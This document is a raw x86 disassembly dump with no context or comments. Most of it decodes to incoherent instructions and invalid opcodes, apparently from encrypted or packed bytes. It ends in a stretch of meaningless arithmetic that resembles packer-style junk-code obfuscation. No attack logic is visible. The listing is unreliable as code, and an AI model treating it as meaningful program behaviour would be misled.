  423427:	mov    ecx,DWORD PTR ds:0xdff3c2a6
  42342d:	xor    BYTE PTR [ebx+0x23abdc05],dl
  423433:	ret    0xbe58
  423436:	pop    esp
  423437:	dec    ebx
  423438:	jne    0x42341b
  42343a:	mov    ds:0x2bde63fa,ax
  423440:	sub    al,0x44
  423442:	pushf  
  423443:	adc    DWORD PTR [ecx-0x1e7f6f26],esi
  423449:	lahf   
  42344a:	pop    edx
  42344b:	jge    0x4234c1
  42344d:	adc    al,0xef
  42344f:	push   0xc9fa2acf
  423454:	in     al,dx
  423455:	repnz xchg esp,eax
  423457:	mov    cl,0x92
  423459:	ret    0x8690
  42345c:	pushf  
  42345d:	add    bl,dh
  42345f:	lods   eax,DWORD PTR ds:[esi]
  423460:	mov    ds:0xe450ccaf,al
  423465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423466:	out    dx,eax
  423467:	pop    esi
  423468:	mov    bh,0xbb
  42346a:	lock jbe 0x423438
  42346d:	out    dx,eax
  42346e:	or     esi,DWORD PTR [ebx-0x65]
  423471:	mov    dh,0x24
  423473:	push   ds
  423474:	icebp  
  423475:	sub    al,BYTE PTR [esi-0x1c]
  423478:	jae    0x423458
  42347a:	adc    DWORD PTR [esi+0x53],ebp
  42347d:	and    dh,BYTE PTR [edx+0x1f]
  423480:	test   al,0x9e
  423482:	nop
  423483:	adc    cl,ah
  423485:	outs   dx,BYTE PTR ds:[esi]
  423486:	xor    al,0xb9
  423488:	into   
  423489:	loopne 0x423435
  42348b:	dec    ecx
  42348c:	jmp    0x3264c727
  423491:	call   0x9ade0396
  423496:	pop    edi
  423497:	fidiv  WORD PTR [esi+eax*8-0x6a572a2e]
  42349e:	out    dx,eax
  42349f:	rcr    BYTE PTR [eax],0xed
  4234a2:	mov    dl,0xe3
  4234a4:	bnd jns 0x423457
  4234a7:	(bad)  [ebx-0x19]
  4234aa:	add    bh,cl
  4234ac:	fwait
  4234ad:	pop    ss
  4234ae:	mov    dl,0xb9
  4234b0:	lods   al,BYTE PTR ds:[esi]
  4234b1:	fdiv   DWORD PTR [ebp-0x5221c479]
  4234b7:	out    0x76,eax
  4234b9:	mov    ?,WORD PTR [edi]
  4234bb:	mov    bh,0xcd
  4234bd:	sbb    dl,BYTE PTR [eax-0x18f2c5d1]
  4234c3:	mov    bl,0x71
  4234c5:	inc    ecx
  4234c6:	outs   dx,BYTE PTR ds:[esi]
  4234c7:	dec    edx
  4234c8:	add    esp,DWORD PTR ds:0x3b642967
  4234ce:	sbb    DWORD PTR [ebx+ebx*4],ebp
  4234d1:	pop    eax
  4234d2:	mov    ah,0xfe
  4234d4:	xor    eax,ebp
  4234d6:	fcom   DWORD PTR [esi-0x4b]
  4234d9:	jmp    0x4234b3
  4234db:	rcl    cl,1
  4234dd:	nop
  4234de:	icebp  
  4234df:	sub    eax,0x2a3e8d35
  4234e4:	sub    DWORD PTR [esi-0x49f71435],esi
  4234ea:	scas   al,BYTE PTR es:[edi]
  4234eb:	xchg   ebp,eax
  4234ec:	lods   al,BYTE PTR ds:[esi]
  4234ed:	fnstsw WORD PTR [edx+0x8]
  4234f0:	out    dx,al
  4234f1:	lods   eax,DWORD PTR ds:[esi]
  4234f2:	fldenv [esi+0x3]
  4234f5:	ficom  WORD PTR [ecx]
  4234f7:	mov    ecx,0xc86860d1
  4234fc:	test   BYTE PTR [ecx-0x64],0xa6
  423500:	or     al,0xd5
  423502:	out    0x29,eax
  423504:	and    DWORD PTR ds:0xde95086c,ebx
  42350a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42350b:	shr    BYTE PTR [eax-0x2f1363b0],0x32
  423512:	nop
  423513:	sti    
  423514:	icebp  
  423515:	data16 sub bl,ah
  423518:	pop    ss
  423519:	inc    edx
  42351a:	jne    0x423566
  42351c:	in     eax,0x88
  42351e:	int3   
  42351f:	add    al,0xd
  423521:	add    al,0xb9
  423523:	int    0x9b
  423525:	dec    ebx
  423526:	in     al,0xb0
  423528:	(bad)  
  423529:	je     0x42358e
  42352b:	jb     0x423585
  42352d:	fdivrp st(3),st
  42352f:	push   ss
  423530:	mov    ch,0x69
  423532:	ja     0x42353c
  423534:	push   ebx
  423535:	fst    QWORD PTR [eax+0x69148b26]
  42353b:	adc    BYTE PTR [ebp+0x24],dl
  42353e:	fstp   DWORD PTR [eax-0x6c]
  423541:	mov    ah,0x25
  423543:	jmp    0x5cd779e3
  423548:	jmp    0xe0cd:0x23bf8fde
  42354f:	pop    es
  423550:	repz jnp 0x4234dc
  423553:	pop    eax
  423554:	(bad)  
  423555:	and    edx,esp
  423557:	adc    eax,0x527229fb
  42355c:	cwde   
  42355d:	dec    edx
  42355e:	int    0xd4
  423560:	icebp  
  423561:	frstor [ecx+edi*1+0x9]
  423565:	not    DWORD PTR [ebx-0x776a6b96]
  42356b:	mov    ch,0x13
  42356d:	ja     0x4234ff
  42356f:	mov    dl,0x3
  423571:	mov    edx,0x1e5bd476
  423576:	retf   0x1449
  423579:	pop    eax
  42357a:	arpl   WORD PTR [edi-0x56],dx
  42357d:	(bad)  
  42357e:	mov    cl,0x75
  423580:	test   eax,0x1f70a1a1
  423585:	pop    edi
  423586:	jl     0x4235c5
  423588:	or     dl,ah
  42358a:	outs   dx,DWORD PTR ds:[esi]
  42358b:	in     ax,dx
  42358d:	aad    0xfe
  42358f:	dec    ecx
  423590:	jnp    0x423600
  423592:	imul   ebx,DWORD PTR [esi+0x1b],0x9b43145a
  423599:	int3   
  42359a:	sahf   
  42359b:	mov    esp,0xdafc289
  4235a0:	jne    0x423596
  4235a2:	adc    al,0x8e
  4235a4:	repnz (bad) 
  4235a7:	fst    DWORD PTR [ecx-0x24]
  4235aa:	jl     0x42352f
  4235ac:	mov    eax,0x9b804924
  4235b1:	pop    ebx
  4235b2:	shl    BYTE PTR [esi-0x6a],0xfa
  4235b6:	push   ds
  4235b7:	dec    edx
  4235b8:	repnz cli 
  4235ba:	xlat   BYTE PTR ds:[ebx]
  4235bb:	sbb    edx,DWORD PTR [ecx-0x6443a111]
  4235c1:	call   0xc34:0xbeda9064
  4235c8:	js     0x4235c6
  4235ca:	sbb    edi,DWORD PTR [ecx-0x7373a1d2]
  4235d0:	loop   0x42356d
  4235d2:	out    0xcb,eax
  4235d4:	fwait
  4235d5:	rol    esp,cl
  4235d7:	push   ss
  4235d8:	cli    
  4235d9:	shr    DWORD PTR [esi-0x2f3385fb],1
  4235df:	outs   dx,DWORD PTR ds:[esi]
  4235e0:	sbb    ebx,DWORD PTR es:[edi+0x51]
  4235e4:	test   eax,0x7e09bc24
  4235e9:	push   0xa49b1d16
  4235ee:	outs   dx,BYTE PTR ds:[esi]
  4235ef:	data16 add ah,bh
  4235f2:	mov    eax,0x3ede4eb1
  4235f7:	xor    bh,ch
  4235f9:	adc    esp,0x43
  4235fc:	cmp    ah,ah
  4235fe:	(bad)  
  4235ff:	push   edi
  423600:	aad    0x50
  423602:	jg     0x4235c5
  423604:	mov    DWORD PTR [esi+0x3e],0x68568d72
  42360b:	dec    edx
  42360c:	sub    DWORD PTR [ecx],ecx
  42360e:	push   edx
  42360f:	(bad)  
  423610:	or     al,0x5e
  423612:	fld    TBYTE PTR ds:0x30e38a9b
  423618:	or     ah,al
  42361a:	xor    BYTE PTR [edi],0x71
  42361d:	(bad)  
  42361e:	rcl    BYTE PTR [edi+0x6c],1
  423621:	jp     0x4235f8
  423623:	and    BYTE PTR [ebx],bh
  423625:	sub    eax,0xc5bf797f
  42362a:	int    0x3b
  42362c:	mov    ecx,0x9fba335d
  423631:	fwait
  423632:	retf   0x7dfd
  423635:	in     eax,0xfc
  423637:	mov    dl,0x39
  423639:	mov    ebx,0x4021da0b
  42363e:	xor    al,0x1b
  423640:	fwait
  423641:	ss sub ebp,edx
  423644:	shl    BYTE PTR [esi-0x21da64ca],cl
  42364a:	sub    DWORD PTR [edi],esi
  42364c:	jg     0x423665
  42364e:	xchg   BYTE PTR [edx],al
  423650:	push   ecx
  423651:	mov    bh,0x90
  423653:	xchg   ebp,esi
  423655:	add    eax,0x3dfa1649
  42365a:	add    BYTE PTR [edx+0x7e],cl
  42365d:	and    BYTE PTR [ebx-0x2f],bl
  423660:	sbb    al,0x6d
  423662:	xchg   esi,eax
  423663:	lds    ebx,FWORD PTR [ebx-0x60c40885]
  423669:	jo     0x4236c7
  42366b:	cmp    edx,esp
  42366d:	fisttp QWORD PTR [ecx+0x63f7dd40]
  423673:	cmc    
  423674:	fist   DWORD PTR [ebx]
  423676:	add    al,BYTE PTR [edi-0x6bf35041]
  42367c:	fwait
  42367d:	dec    esp
  42367e:	lods   al,BYTE PTR ds:[esi]
  42367f:	cwde   
  423680:	or     BYTE PTR [ebp+0x73],ch
  423683:	dec    ebp
  423684:	out    dx,al
  423685:	cli    
  423686:	pop    ss
  423687:	push   edx
  423688:	push   0xffffff8c
  42368a:	xor    BYTE PTR [esi],cl
  42368c:	dec    ebp
  42368d:	lds    esp,FWORD PTR [ebx-0x6f486e5d]
  423693:	sub    al,0x34
  423695:	arpl   WORD PTR [ebp+0x1bde506a],ax
  42369b:	das    
  42369c:	stc    
  42369d:	jge    0x42367b
  42369f:	push   esp
  4236a0:	into   
  4236a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236a2:	nop
  4236a3:	ret    0x971c
  4236a6:	test   al,0x8e
  4236a8:	fcmovu st,st(1)
  4236aa:	dec    edi
  4236ab:	dec    edx
  4236ac:	and    DWORD PTR [ecx+0x5],esi
  4236af:	addr16 push ebx
  4236b1:	je     0x4236c5
  4236b3:	sti    
  4236b4:	fwait
  4236b5:	repz and ebx,DWORD PTR [esi-0x46]
  4236b9:	dec    ebx
  4236ba:	jb     0x423648
  4236bc:	mov    bl,0x18
  4236be:	pop    ebp
  4236bf:	neg    DWORD PTR [edi+eax*4+0x19cb329b]
  4236c6:	ins    DWORD PTR es:[edi],dx
  4236c7:	push   cs
  4236c8:	out    0x52,eax
  4236ca:	nop
  4236cb:	pop    ecx
  4236cc:	add    edx,DWORD PTR [ecx-0x19]
  4236cf:	jbe    0x4236f4
  4236d1:	pop    ebp
  4236d2:	and    ecx,DWORD PTR [edx+0x6b]
  4236d5:	and    DWORD PTR [esi+edx*1+0x29ac43e3],eax
  4236dc:	lahf   
  4236dd:	add    cl,dl
  4236df:	mov    ecx,0x9f115f3a
  4236e4:	out    0xee,al
  4236e6:	push   edi
  4236e7:	or     edi,DWORD PTR [edx-0x200b223]
  4236ed:	std    
  4236ee:	sub    al,0x6e
  4236f0:	ins    BYTE PTR es:[edi],dx
  4236f1:	jae    0x423692
  4236f3:	add    esp,ebx
  4236f5:	pop    edi
  4236f6:	and    al,0x4a
  4236f8:	inc    eax
  4236f9:	jecxz  0x42373e
  4236fb:	fstp   st(2)
  4236fd:	adc    eax,0xb59c5113
  423702:	inc    DWORD PTR [esi-0x17]
  423705:	pop    edx
  423706:	push   edx
  423707:	adc    bh,BYTE PTR [eax-0x36]
  42370a:	ror    BYTE PTR ds:0x3286ea5b,0x82
  423711:	fidiv  WORD PTR [ecx]
  423713:	mov    ah,0x13
  423715:	add    DWORD PTR [eax+0x6d],0xfffffff9
  423719:	add    DWORD PTR [ecx+0x3ed494bf],edx
  42371f:	jge    0x4236bb
  423721:	mov    bh,0x80
  423723:	sub    eax,0x902fe217
  423728:	icebp  
  423729:	call   0x7782:0x8a310a14
  423730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423731:	sub    BYTE PTR [eax-0x72],al
  423734:	adc    dh,bl
  423736:	xor    eax,edx
  423738:	lds    esp,FWORD PTR [edx]
  42373a:	jg     0x423786
  42373c:	jne    0x423773
  42373e:	lea    esi,[ebp-0x27]
  423741:	out    0x84,al
  423743:	cmp    eax,0xbfec004b
  423748:	(bad)  
  423749:	(bad)  [ecx-0x4f4fdd3e]
  42374f:	repz lock (bad) 
  423753:	pop    esi
  423754:	pop    ss
  423755:	xchg   edx,eax
  423756:	jne    0x42374d
  423758:	or     al,0xd6
  42375a:	repz mov ebx,DWORD PTR [ebx+0x57c1a720]
  423761:	sbb    BYTE PTR [eax],ch
  423763:	scas   al,BYTE PTR es:[edi]
  423764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423765:	fstp   QWORD PTR [edi]
  423767:	cs int 0xde
  42376a:	cmp    eax,0x9049e33a
  42376f:	int3   
  423770:	sbb    esp,DWORD PTR [esi+0x60]
  423773:	or     esi,DWORD PTR [esi]
  423775:	push   esi
  423776:	push   ds
  423777:	dec    edx
  423778:	mov    BYTE PTR [edi],ch
  42377a:	das    
  42377b:	jl     0x42373d
  42377d:	inc    ecx
  42377e:	push   0xfcfa9bbe
  423783:	push   ebp
  423784:	mov    esi,edi
  423786:	call   0xe32197e8
  42378b:	push   ebx
  42378c:	sub    ah,BYTE PTR [ebx]
  42378e:	or     eax,0x2a4e7c00
  423793:	push   0xc990288b
  423798:	sti    
  423799:	fst    DWORD PTR [edi]
  42379b:	inc    esi
  42379d:	inc    esi
  42379e:	xchg   esp,eax
  42379f:	stc    
  4237a0:	fcmovu st,st(5)
  4237a2:	mov    eax,0x2f858904
  4237a7:	sub    DWORD PTR [esi+0x40],esi
  4237aa:	xchg   ecx,eax
  4237ab:	mov    ebp,0x52abc56f
  4237b0:	call   0x4bcc:0x45a7088
  4237b7:	dec    edx
  4237b8:	adc    edi,DWORD PTR ds:0x6fe45bba
  4237be:	aad    0x13
  4237c0:	fwait
  4237c1:	sub    al,dl
  4237c3:	cmp    edi,DWORD PTR [esi-0xd5b9a85]
  4237c9:	fst    QWORD PTR [edi-0x5e88800c]
  4237cf:	dec    eax
  4237d0:	(bad)  
  4237d1:	xor    dl,BYTE PTR [eax-0x462f70fd]
  4237d7:	cdq    
  4237d8:	mov    al,ds:0x3a7659c2
  4237dd:	sbb    bl,cl
  4237df:	dec    ecx
  4237e0:	push   DWORD PTR [esi+0xd4cb932]
  4237e6:	nop
  4237e7:	leave  
  4237e8:	repnz inc esp
  4237ea:	mov    ebp,0x8e82335f
  4237ef:	dec    edx
  4237f0:	mov    esp,fs
  4237f2:	jecxz  0x4237a7
  4237f4:	les    eax,FWORD PTR [esp]
  4237f7:	outs   dx,DWORD PTR ds:[esi]
  4237f8:	(bad)  
  4237f9:	sti    
  4237fa:	add    BYTE PTR [edx-0x37],cl
  4237fd:	rcr    esp,cl
  4237ff:	xor    esi,DWORD PTR [edx-0xb63a14]
  423805:	int3   
  423806:	cmp    DWORD PTR [esi-0x3b],ecx
  423809:	and    al,0x9b
  42380b:	mov    eax,0x6a1ee09b
  423810:	dec    esi
  423811:	jno    0x423803
  423813:	aaa    
  423814:	(bad)  
  423816:	add    BYTE PTR [ebx],bl
  423818:	(bad)  
  423819:	loope  0x4237ac
  42381b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42381c:	(bad)  [ecx]
  42381e:	in     eax,0xf8
  423820:	sbb    esi,DWORD PTR [ecx-0x70eb38e5]
  423826:	nop
  423827:	push   ebp
  423828:	shl    BYTE PTR [ebp-0x39d5824d],0xdc
  42382f:	dec    esp
  423830:	and    al,cl
  423832:	mov    BYTE PTR [esi],bl
  423834:	ror    DWORD PTR [eax],0x30
  423837:	mov    bl,0x1c
  423839:	jo     0x4238ad
  42383b:	xchg   edi,eax
  42383c:	fwait
  42383d:	iret   
  42383e:	add    eax,0x333eb98b
  423843:	inc    ebp
  423844:	inc    eax
  423845:	ficomp WORD PTR [ebx-0x41735e5a]
  42384b:	adc    ch,dh
  42384d:	in     al,0x8f
  42384f:	xchg   ebp,eax
  423850:	jne    0x4238cc
  423852:	rcr    DWORD PTR [ebp+0x4a7620c7],0xb8
  423859:	jl     0x4238d5
  42385b:	in     eax,dx
  42385c:	out    dx,al
  42385d:	and    al,0x7b
  42385f:	jecxz  0x4237fc
  423861:	push   ebp
  423862:	mov    edx,0x17b17e7f
  423867:	mov    ah,0x73
  423869:	(bad)  
  42386b:	jmp    0x606f54ef
  423870:	lock rcl DWORD PTR [edi+0x15075ab1],1
  423877:	and    al,0xdb
  423879:	pop    edi
  42387a:	pop    es
  42387b:	inc    edx
  42387c:	mov    esi,ds
  42387e:	mov    dh,0xa4
  423880:	push   esp
  423881:	jno    0x423877
  423883:	pop    eax
  423884:	loopne 0x4238b4
  423886:	nop
  423887:	daa    
  423888:	hlt    
  423889:	imul   esi,DWORD PTR [ecx+0x3110dd90],0xd9ddde34
  423893:	inc    ebp
  423894:	and    BYTE PTR [ebx-0x58],cl
  423897:	dec    esp
  423898:	jb     0x4238a1
  42389a:	enter  0xcad1,0xdd
  42389e:	mov    eax,ds:0x25279a80
  4238a3:	aaa    
  4238a4:	sbb    esi,ebx
  4238a6:	jmp    0x1b0c4071
  4238ab:	cs add ebx,0x9cd5b090
  4238b2:	outs   dx,DWORD PTR ds:[esi]
  4238b3:	mov    ds:0x58a400da,eax
  4238b8:	stc    
  4238b9:	(bad)  
  4238ba:	cmp    DWORD PTR [ebx],eax
  4238bc:	sbb    esp,DWORD PTR [ebp+0xd781592]
  4238c2:	push   eax
  4238c3:	pop    esp
  4238c4:	jl     0x423886
  4238c6:	iret   
  4238c7:	int    0xa7
  4238c9:	fucom  st(6)
  4238cb:	adc    al,0x5c
  4238cd:	cmp    DWORD PTR [edx+0x4d],edi
  4238d0:	(bad)  
  4238d1:	mov    eax,0xae360990
  4238d6:	pop    eax
  4238d7:	jno    0x42390c
  4238d9:	jmp    0xf07c8300
  4238de:	and    edi,DWORD PTR [edx]
  4238e0:	cwde   
  4238e1:	xor    al,0xb5
  4238e3:	jge    0x4238bf
  4238e5:	push   esp
  4238e6:	cmp    DWORD PTR fs:[bp+di+0x5350],ebx
  4238ec:	pop    ebp
  4238ed:	(bad)  
  4238ee:	xlat   BYTE PTR ds:[ebx]
  4238ef:	inc    eax
  4238f0:	cmp    eax,0xbda172de
  4238f5:	mul    DWORD PTR [ebp-0x6f8c4398]
  4238fb:	mul    BYTE PTR [edi+0x14de5ec5]
  423901:	pop    esp
  423902:	push   ds
  423903:	sub    bh,BYTE PTR [eax]
  423905:	fiadd  WORD PTR [edx-0x54]
  423908:	sub    ecx,DWORD PTR ds:0x60f90ab5
  42390e:	nop
  42390f:	cmp    cl,BYTE PTR [ebp+0x2e]
  423912:	sahf   
  423913:	sub    al,0xae
  423915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423916:	mov    ds:0x85de2643,al
  42391b:	inc    ebp
  42391c:	inc    esp
  42391d:	push   edx
  42391e:	or     DWORD PTR [edi-0x436fc1f5],ebx
  423924:	int3   
  423925:	daa    
  423926:	cld    
  423927:	ret    
  423928:	jbe    0x423923
  42392a:	pop    ecx
  42392b:	mov    ebp,0x66a8e590
  423930:	ins    DWORD PTR es:[edi],dx
  423931:	push   es
  423932:	fdivr  st,st(6)
  423934:	test   BYTE PTR [esi+0x4],bl
  423937:	mov    ebp,DWORD PTR [ebx+0x33]
  42393a:	pop    es
  42393b:	or     ebx,DWORD PTR [ebx+0x2dce48f0]
  423941:	sbb    al,0xc6
  423943:	push   es
  423944:	xor    bh,ah
  423946:	and    ebp,DWORD PTR [ebx+0xa261edd]
  42394c:	adc    BYTE PTR [esp+edx*4+0x28c25daa],dl
  423953:	add    bl,BYTE PTR [ebp-0x4263c43f]
  423959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42395a:	ror    esp,cl
  42395c:	pop    edx
  42395d:	pusha  
  42395e:	lock sub DWORD PTR [ebx+0x69],ecx
  423962:	jmp    0x4239ad
  423964:	adc    BYTE PTR [edi-0x63],bh
  423967:	test   DWORD PTR [edx-0x564205c4],edi
  42396d:	loop   0x4238f7
  42396f:	fistp  WORD PTR es:0xbed3e424
  423976:	and    DWORD PTR [edx+0x72],ecx
  423979:	shl    BYTE PTR [ebx-0x20],cl
  42397c:	iret   
  42397d:	mov    eax,0xd79b9973
  423982:	(bad)  [ecx]
  423984:	je     0x423924
  423986:	pushf  
  423987:	dec    esi
  423988:	mov    eax,0x9e432cdd
  42398d:	mulps  xmm7,XMMWORD PTR [ebx-0x326f7ad7]
  423994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423995:	push   eax
  423996:	xor    DWORD PTR [eax+0x47],0x79820637
  42399d:	dec    edx
  42399e:	nop
  42399f:	push   es
  4239a0:	scas   eax,DWORD PTR es:[edi]
  4239a1:	pop    es
  4239a2:	pop    ds
  4239a3:	add    eax,DWORD PTR [ecx]
  4239a5:	push   esi
  4239a6:	fwait
  4239a7:	sbb    ah,BYTE PTR [edx-0x1a]
  4239aa:	out    dx,eax
  4239ab:	dec    esp
  4239ac:	fistp  WORD PTR [esi-0x1c]
  4239af:	cmp    DWORD PTR [eax+0x51],ebx
  4239b2:	add    cl,BYTE PTR [edx+0x3f]
  4239b5:	popa   
  4239b6:	jno    0x4239d9
  4239b8:	jmp    0x4239a2
  4239ba:	les    edi,FWORD PTR [edi]
  4239bc:	fdivr  DWORD PTR [esi+eiz*4]
  4239bf:	push   edi
  4239c0:	push   eax
  4239c1:	sbb    esp,DWORD PTR ds:0x9995562a
  4239c7:	cmp    ch,BYTE PTR [edx]
  4239c9:	dec    esi
  4239ca:	mov    ecx,0xd6de04c8
  4239cf:	cwde   
  4239d0:	aaa    
  4239d1:	jno    0x4239b1
  4239d3:	mov    edx,0xd440d2cb
  4239d8:	fwait
  4239d9:	push   cs
  4239da:	xor    DWORD PTR [edi],0x2d3af3e3
  4239e0:	adc    dh,bl
  4239e2:	sub    edx,edi
  4239e4:	mov    dl,0xc6
  4239e6:	aad    0xbf
  4239e8:	mov    bl,dl
  4239ea:	mov    dh,BYTE PTR [ebx+ebx*4+0x66]
  4239ee:	sbb    al,0x3f
  4239f0:	push   edi
  4239f1:	loop   0x4239ff
  4239f3:	fs out 0xdd,al
  4239f6:	add    DWORD PTR [ebx-0xf],ebp
  4239f9:	inc    edx
  4239fa:	dec    edi
  4239fb:	and    eax,DWORD PTR [esi-0x53]
  4239fe:	xchg   ecx,eax
  4239ff:	ja     0x423a80
  423a01:	mov    edx,0x5920b167
  423a06:	mov    BYTE PTR [ebp+0xb4fe185],ch
  423a0c:	sbb    dl,BYTE PTR [ebx-0x9acbc6b]
  423a12:	adc    DWORD PTR [edx],esp
  423a14:	fwait
  423a15:	call   0x8fc8:0x59900988
  423a1c:	sub    dh,bl
  423a1e:	and    ecx,ebx
  423a20:	pop    ss
  423a21:	cs jno 0x423a52
  423a24:	mov    DWORD PTR [ebp-0x70],ebx
  423a27:	lods   al,BYTE PTR ds:[esi]
  423a28:	repnz popf 
  423a2a:	gs sahf 
  423a2c:	out    0x11,al
  423a2e:	clc    
  423a2f:	popa   
  423a30:	inc    ebx
  423a31:	jnp    0x4239d7
  423a33:	jae    0x423ab1
  423a35:	(bad)
  423a39:	cdq    
  423a3a:	mov    ah,0xea
  423a3c:	push   ds
  423a3d:	cmp    al,BYTE PTR [ecx-0x3e2196de]
  423a43:	pop    eax
  423a44:	out    dx,eax
  423a45:	xchg   ebp,eax
  423a46:	mov    edx,0x9efe6a5d
  423a4b:	push   cs
  423a4c:	inc    ebx
  423a4d:	icebp  
  423a4e:	and    ch,BYTE PTR [edx]
  423a50:	div    BYTE PTR [ebp-0x2239d02b]
  423a56:	jae    0x423a47
  423a58:	mov    cl,0xef
  423a5a:	inc    edi
  423a5b:	adc    eax,0xb1935be6
  423a60:	and    eax,0x4298204e
  423a65:	into   
  423a66:	jecxz  0x423a92
  423a68:	jecxz  0x423a47
  423a6a:	ins    DWORD PTR es:[edi],dx
  423a6b:	cmp    DWORD PTR [eax+0x45f78d14],eax
  423a71:	dec    ebx
  423a72:	nop
  423a73:	les    eax,FWORD PTR [ebx+0x6d]
  423a76:	hlt    
  423a77:	fisubr DWORD PTR [eax+0x1d2fc869]
  423a7d:	pop    ecx
  423a7e:	cli    
  423a7f:	dec    ecx
  423a80:	adc    al,0x9a
  423a82:	or     dh,cl
  423a84:	and    eax,0x9e6cdcf9
  423a89:	or     DWORD PTR [ebp+0x7b],eax
  423a8c:	jb     0x423b0b
  423a8e:	shl    cl,cl
  423a90:	popa   
  423a91:	push   cs
  423a92:	jb     0x423a4e
  423a94:	add    al,0xc4
  423a96:	fimul  WORD PTR [edx+0x6c]
  423a99:	test   dh,dl
  423a9b:	or     cl,BYTE PTR [edi+0x18]
  423a9e:	cld    
  423a9f:	inc    ebp
  423aa0:	dec    ecx
  423aa1:	push   es
  423aa2:	nop
  423aa3:	sbb    al,0x34
  423aa5:	popa   
  423aa6:	xchg   esp,eax
  423aa7:	repnz test al,0x63
  423aaa:	push   0xdaa2474a
  423aaf:	mov    ah,BYTE PTR [esi-0x4d]
  423ab2:	and    eax,0x57f1d695
  423ab7:	dec    edx
  423ab8:	test   DWORD PTR [ebx+0x26],0x14efecd7
  423abf:	push   ebp
  423ac0:	push   ds
  423ac1:	retf   
  423ac2:	xchg   BYTE PTR [edi-0x6e],cl
  423ac5:	pop    esi
  423ac6:	mov    eax,0x5ac96a3a
  423acb:	fidiv  DWORD PTR [edi-0x17]
  423ace:	mov    WORD PTR [edx],?
  423ad0:	rol    BYTE PTR [edx+0x226d8390],1
  423ad6:	inc    edi
  423ad7:	call   0x4c3fec77
  423adc:	int3   
  423add:	push   esi
  423ade:	push   0xffffffbb
  423ae0:	dec    ebx
  423ae1:	sti    
  423ae2:	add    al,0xa6
  423ae5:	popf   
  423ae6:	(bad)  
  423ae7:	pop    ebp
  423ae8:	in     al,dx
  423ae9:	pop    edi
  423aea:	xor    BYTE PTR [edx-0x53],ah
  423aed:	xchg   esp,eax
  423aee:	in     eax,0xe
  423af0:	mov    ds:0x7befc8c4,al
  423af5:	aas    
  423af6:	mov    ebp,0xcfec1ab6
  423afb:	sub    BYTE PTR [edi+0x557ad0b8],bl
  423b01:	mov    ebp,esp
  423b03:	sub    esp,0x4c
  423b06:	xor    eax,eax
  423b08:	mov    DWORD PTR [ebp-0x24],eax
  423b0b:	push   ebx
  423b0c:	add    eax,eax
  423b0e:	mov    ebx,DWORD PTR [ebp-0x24]
  423b11:	mov    eax,DWORD PTR [ebp-0x24]
  423b14:	cmp    ebx,DWORD PTR [ebp-0x4]
  423b17:	jne    0x423b43
  423b19:	cmp    eax,0xe228
  423b1e:	je     0x423b43
  423b20:	cmp    ebx,0xfffffffa
  423b23:	je     0x423b43
  423b25:	cmp    ebx,eax
  423b27:	je     0x423b43
  423b29:	mov    edx,DWORD PTR ds:0x438098
  423b2f:	add    ebx,eax
  423b31:	mov    eax,DWORD PTR ds:0x43804c
  423b37:	sub    DWORD PTR [ebp-0x24],edx
  423b3a:	sub    ebx,edx
  423b3c:	add    eax,ebx
  423b3e:	and    eax,ebx
  423b40:	and    DWORD PTR [ebp-0x24],eax
  423b43:	push   esi
  423b44:	add    ebx,edx
  423b46:	sub    DWORD PTR [ebp-0x24],ebx
  423b49:	push   edi
  423b4a:	mov    esi,DWORD PTR [ebp-0x24]
  423b4d:	add    esi,eax
  423b4f:	mov    edx,eax
  423b51:	or     edx,eax
  423b53:	test   edx,0xd5ba
  423b59:	jne    0x423b6c
  423b5b:	mov    ecx,DWORD PTR [ebp-0x24]
  423b5e:	mov    edi,edx
  423b60:	sub    esi,ecx
  423b62:	add    DWORD PTR [ebp-0x24],esi
  423b65:	or     edi,ecx
  423b67:	add    edi,ecx
  423b69:	mov    DWORD PTR [ebp-0x24],edi
  423b6c:	and    edi,eax
  423b6e:	cmp    edi,eax
  423b70:	jne    0x423b75
  423b72:	and    DWORD PTR [ebp-0x24],edi
  423b75:	or     DWORD PTR [ebp-0x24],esi
  423b78:	mov    ecx,ebx
  423b7a:	sub    ecx,edx
  423b7c:	mov    eax,DWORD PTR [ebp-0x24]
  423b7f:	and    ecx,edx
  423b81:	and    ecx,edi
  423b83:	cmp    ecx,DWORD PTR ds:0x438098
  423b89:	jne    0x423c00
  423b8b:	mov    esi,DWORD PTR [ebp-0x24]
  423b8e:	mov    DWORD PTR [ebp-0x24],ecx
  423b91:	mov    edi,0xe
  423b96:	and    esi,ebx
  423b98:	cmp    esi,DWORD PTR ds:0x43804c
  423b9e:	jne    0x423c00
  423ba0:	cmp    esi,DWORD PTR ds:0x43804c
  423ba6:	je     0x423c00
  423ba8:	add    edi,edx
  423baa:	cmp    esi,0xffffffda
  423bad:	jne    0x423c00
  423baf:	mov    ebx,0x5e
  423bb4:	mov    ecx,DWORD PTR [ebp-0x24]
  423bb7:	add    DWORD PTR [ebp-0x24],ecx
  423bba:	or     DWORD PTR [ebp-0x24],eax
  423bbd:	add    DWORD PTR [ebp-0x24],ebx
  423bc0:	sub    edi,ebx
  423bc2:	cmp    edi,0x276e
  423bc8:	jne    0x423c00
  423bca:	cmp    edi,0xffffffc4
  423bcd:	jne    0x423c00
  423bcf:	mov    edx,DWORD PTR [ebp-0x24]
  423bd2:	mov    ecx,0x60
  423bd7:	add    ecx,eax
  423bd9:	add    DWORD PTR [ebp-0x24],edx
  423bdc:	sub    DWORD PTR [ebp-0x24],eax
  423bdf:	sub    edi,ecx
  423be1:	sub    edi,eax
  423be3:	add    edi,ebx
  423be5:	cmp    esi,DWORD PTR [ebp-0x24]
  423be8:	je     0x423c00
  423bea:	cmp    edi,0x40d3
  423bf0:	jne    0x423c00
  423bf2:	add    DWORD PTR [ebp-0x24],esi
  423bf5:	cmp    edi,DWORD PTR ds:0x438098
  423bfb:	je     0x423c00
  423bfd:	add    DWORD PTR [ebp-0x24],edi
  423c00:	xor    DWORD PTR [ebp-0x24],edx
  423c03:	xor    edi,edi
  423c05:	mov    edx,ebx
  423c07:	add    DWORD PTR [ebp-0x24],edx
  423c0a:	sub    DWORD PTR [ebp-0x24],ecx
